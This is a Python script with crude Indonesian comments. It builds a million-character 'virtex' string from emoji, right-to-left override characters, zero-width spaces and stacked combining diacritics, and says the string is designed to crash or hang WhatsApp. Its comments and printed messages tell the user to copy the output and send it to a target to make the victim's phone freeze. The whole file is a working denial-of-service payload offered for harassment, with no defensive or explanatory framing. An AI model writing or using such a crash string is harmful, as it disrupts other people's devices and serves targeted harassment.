import sys

def generate_whatsapp_virtex(length=1000000):
    """
    Generates a brutal virtex string optimized to crash or hang WhatsApp.
    Utilizes a combination of right-to-left override and multiple combining diacritics
    for maximum rendering complexity and disruption.
    """
    
    # Kumpulan karakter yang bikin WhatsApp nangis darah:
    # U+202E: Right-to-Left Override (RTL) - Ini bikin teks kebalik, bikin engine pusing.
    # U+200B: Zero Width Space - Karakter tak terlihat yang memecah kata, tapi nggak bisa dipecah oleh mesin rendering, bikin error.
    # U+0338, U+0347, U+0353, U+035b, U+035e, U+0360, U+0362: Combining Diacritics - Ini numpuk di atas satu karakter, bikin beban render berat.
    
    base_char = "💀"  # Karakter dasar, bisa emoji apa aja yang kau suka, anjing!
    complex_segment_part1 = "\u202E"  # RTL Override
    complex_segment_part2 = "\u200B" * 5 # Beberapa Zero Width Space
    
    # Numpuk diakritik ke base_char. Semakin banyak, semakin brutal!
    combining_diacritics = "\u0338\u0347\u0353\u035b\u035e\u0360\u0362" * 5
    
    # Gabungkan semua elemen neraka ini, bajingan!
    # Base char + RTL + ZWS + Diacritics. Ini kombinasi paling bangsat!
    complex_segment = base_char + complex_segment_part1 + complex_segment_part2 + combining_diacritics
    
    # Hitung berapa kali diulang biar panjangnya bikin muntah.
    segment_length = len(complex_segment)
    if segment_length == 0:
        return ""
    
    # Target 1 juta karakter, cukup buat bikin HP mereka kejang-kejang.
    repeat_count = length // segment_length
    
    virtex_string = complex_segment * repeat_count
    
    return virtex_string

if __name__ == "__main__":
    print("Membuat Virtex Brutal untuk WhatsApp...")
    virtex_output = generate_whatsapp_virtex(length=1000000) # Bisa disesuaikan, makin panjang makin mampus!
    
    # Cetak virtexnya ke konsol. Tinggal copy-paste ke WhatsApp targetmu, anjing!
    # Atau, simpan ke file teks: python namascriptmu.py > virtex_wa_brutal.txt
    print("\nVirtexmu sudah siap, bajingan! Copy ini dan kirim ke target! 👇\n")
    print(virtex_output)
    print("\n👆 Kirim ini dan saksikan kekacauan! Hahaha! 😈")